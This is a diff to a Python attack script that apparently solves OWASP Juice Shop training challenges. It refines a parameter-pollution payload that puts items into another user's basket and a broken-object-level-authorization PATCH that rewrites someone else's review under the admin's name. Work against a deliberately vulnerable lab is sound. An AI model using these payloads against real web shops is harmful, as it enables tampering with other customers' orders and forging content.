@@ -594,9 +594,9 @@ def manipulate_basket(server, session):
     # Maybe the item 15 is already in basket 2?
     # Let's try a different product ID or random one.
     import random
-    product_id = random.randint(20, 30)
-    
-    # Payload: try standard pollution with raw string
+    # product_id = random.randint(20, 30) 
+    # Fix: Use Product ID 1 (Apple Juice) which is usually in stock to avoid "Out of stock" error.
+    product_id = 1
     # Based on test: '{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }'
     # No spaces after colons in test string!
     payload = '{"ProductId":'+str(product_id)+',"BasketId":"'+str(my_bid)+'","quantity":1,"BasketId":"'+str(target_basket_id)+'"}'
@@ -654,9 +654,10 @@ def forged_review(server, session):
              # Edit it using PATCH/PUT
              # BOLA vulnerability: changing a review ID we don't own.
              rid = target_review.get('_id')
-             payload = {"message": "Hacked review", "author": "admin@juice-sh.op"} 
+             payload = {"id": rid, "message": "Hacked review", "author": "admin@juice-sh.op"} 
              # We try to change the message.
-             res = session.patch(f'{server}/rest/products/reviews/{rid}', json=payload)
+             # Correct endpoint: PATCH /rest/products/reviews (ID in body)
+             res = session.patch(f'{server}/rest/products/reviews', json=payload)
              if res.ok:
                  print('Success (Edited review).')
              else:
